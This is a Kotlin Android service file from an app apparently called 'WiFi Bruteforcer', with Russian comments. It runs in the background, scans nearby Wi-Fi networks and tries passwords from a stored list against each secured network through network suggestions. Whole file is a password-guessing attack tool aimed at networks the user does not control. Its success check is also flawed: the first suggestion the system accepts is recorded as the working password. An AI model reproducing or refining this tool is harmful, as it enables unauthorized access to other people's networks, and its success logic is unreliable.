package com.santaklouse.example.wifibruteforcer

import android.R
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.net.wifi.WifiManager
import android.net.wifi.WifiNetworkSuggestion
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import androidx.core.app.NotificationCompat

class WifiScanService_old : Service() {

    private lateinit var wifiManager: WifiManager
    private val handler = Handler(Looper.getMainLooper())
    private val scanInterval = 60000L // 60 сек

    private val processedNetworks = mutableSetOf<String>() // BSSID уже обработанных сетей
    private val successfulNetworks = mutableMapOf<String, String>() // SSID -> пароль

    private val wifiReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val success = intent?.getBooleanExtra(WifiManager.EXTRA_RESULTS_UPDATED, false) ?: false
            if (success) processScanResults()
        }
    }

    private val connectionReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val wifiInfo = wifiManager.connectionInfo
            if (wifiInfo != null && wifiInfo.networkId != -1) {
                val ssid = wifiInfo.ssid.removeSurrounding("\"")
                if (successfulNetworks.containsKey(ssid)) {
                    sendLog("Реально подключены к: $ssid")
                }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        wifiManager = applicationContext.getSystemService(WIFI_SERVICE) as WifiManager

        createNotificationChannel()
        startForeground(1, createNotification())

        registerReceiver(wifiReceiver, IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION))
        registerReceiver(connectionReceiver, IntentFilter(WifiManager.NETWORK_STATE_CHANGED_ACTION))

        handler.post(scanRunnable)
        sendLog("Сервис запущен")
    }

    private val scanRunnable: Runnable = Runnable {
        if (wifiManager.isWifiEnabled) {
            wifiManager.startScan()
            sendLog("Сканирование WiFi запущено")
        }
        handler.postDelayed(scanRunnable, scanInterval)
    }

    private fun processScanResults() {
        val results = wifiManager.scanResults ?: return
        val passwords = PasswordManager.getPasswords(this)
        val allItems = mutableListOf<NetworkItem>()

        for (result in results) {
            val ssid = result.SSID
            if (ssid.isEmpty()) continue
            val bssid = result.BSSID

            if (processedNetworks.contains(bssid)) continue // Уже пробовали эту сеть

            processedNetworks.add(bssid)

            sendLog("Найдена новая сеть: $ssid ($bssid)")

            if (result.capabilities.contains("WEP") || result.capabilities.contains("WPA") || result.capabilities.contains("SAE")) {
                val password = tryFindWorkingPassword(ssid, passwords)
                val status = if (password != null) {
                    successfulNetworks[ssid] = password
                    Status.SUCCESS
                } else Status.FAILED

                allItems.add(NetworkItem(ssid, bssid, status, result.level, password))
            } else {
                allItems.add(NetworkItem(ssid, bssid, Status.OPEN, result.level))
            }
        }

        val sortedList = allItems.sortedWith(
            compareByDescending<NetworkItem> { it.status == Status.SUCCESS }
                .thenByDescending { it.signal }
        )

        val intent = Intent("UPDATE_NETWORKS")
        intent.putParcelableArrayListExtra("networks", ArrayList(sortedList))
        sendBroadcast(intent)
    }

    private fun tryFindWorkingPassword(ssid: String, passwords: List<String>): String? {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) return null

        for (pass in passwords) {
            try {
                val suggestion = WifiNetworkSuggestion.Builder()
                    .setSsid(ssid)
                    .setWpa2Passphrase(pass)
                    .build()

                val status = wifiManager.addNetworkSuggestions(listOf(suggestion))
                if (status == WifiManager.STATUS_NETWORK_SUGGESTIONS_SUCCESS) {
                    sendLog("Предложен пароль '$pass' для $ssid")
                    return pass // Возвращаем первый предложенный
                }
            } catch (e: Exception) {}
        }
        return null
    }

    private fun sendLog(message: String) {
        val intent = Intent("LOG_UPDATE")
        intent.putExtra("log", message)
        sendBroadcast(intent)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "wifi_scan_channel",
                "WiFi Scanner Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Сканирование и подключение к WiFi сетям"
            }
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
    }

    private fun createNotification() = NotificationCompat.Builder(this, "wifi_scan_channel")
        .setContentTitle("WiFi Bruteforcer")
        .setContentText("Работает в фоне...")
        .setSmallIcon(R.drawable.ic_menu_compass)
        .setPriority(NotificationCompat.PRIORITY_LOW)
        .setOngoing(true)
        .build()

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        handler.removeCallbacks(scanRunnable)
        try { unregisterReceiver(wifiReceiver) } catch (e: Exception) {}
        try { unregisterReceiver(connectionReceiver) } catch (e: Exception) {}
        sendLog("Сервис остановлен")
        super.onDestroy()
    }
}